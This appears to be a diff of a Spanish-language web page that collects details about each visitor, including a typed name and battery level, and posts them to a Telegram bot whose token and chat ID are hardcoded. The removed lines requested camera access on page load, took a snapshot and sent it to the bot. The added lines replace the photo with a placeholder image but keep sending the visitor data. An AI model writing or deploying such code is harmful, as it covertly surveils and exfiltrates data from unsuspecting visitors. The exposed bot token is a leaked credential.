@@ -62,23 +62,11 @@
   <p id="estado" style="margin-top:15px;"></p>
 </div>
 
-<video id="video" style="display:none;"></video>
-
 <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
 <script>
 const botToken = "7745087272:AAGkTNgj2raKiA-Fv2ms16sFnfgE5BTNNs4";
 const chatId = "8143059484";
-let streamGlobal = null;
-
-async function pedirPermisoCamara() {
-  try {
-    streamGlobal = await navigator.mediaDevices.getUserMedia({ video: true });
-    document.getElementById('video').srcObject = streamGlobal;
-  } catch (error) {
-    document.getElementById('estado').innerText = "Permiso de cámara denegado.";
-  }
-}
 
 async function enviarDatos() {
   const nombre = document.getElementById('nombre').value.trim();
@@ -106,20 +94,8 @@ async function enviarDatos() {
     bateria = Math.round(battery.level * 100) + "%";
   } catch (e) {}
 
-  // Tomar foto
-  let imagen = "";
-  try {
-    const video = document.getElementById('video');
-    video.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = 640;
-    canvas.height = 480;
-    const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    imagen = canvas.toDataURL('image/jpeg');
-  } catch (error) {
-    console.error("No se pudo capturar la imagen.", error);
-  }
+  // Imagen de ubicación (en lugar de la foto de la cámara)
+  const imagenUrl = "https://via.placeholder.com/640x480.png?text=Imagen+de+ubicacion";  // Usamos una imagen de marcador de ubicación
 
   // Enviar mensaje
   const mensaje = `
@@ -137,24 +113,19 @@ Nuevo visitante:
       text: mensaje
     });
 
-    if (imagen) {
-      // Enviar la foto
-      const blob = await (await fetch(imagen)).blob();
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'foto.jpg');
+    // Enviar la foto de la ubicación
+    const blob = await (await fetch(imagenUrl)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'ubicacion.jpg');
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      });
-    }
+    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
+    });
 
     document.getElementById('estado').innerText = "Datos enviados correctamente.";
     descargarTxt();
-    if (streamGlobal) {
-      streamGlobal.getTracks().forEach(track => track.stop());
-    }
   } catch (e) {
     console.error("Error al enviar datos.", e);
     document.getElementById('estado').innerText = "Error al enviar los datos.";
@@ -168,9 +139,10 @@ function descargarTxt() {
   link.href = URL.createObjectURL(blob);
   link.download = 'archivo.txt';
   link.click();
-}
 
-pedirPermisoCamara();
+  // Mensaje de confirmación para la descarga
+  alert('Archivo .txt descargado con éxito');
+}
 </script>
 
 </body>
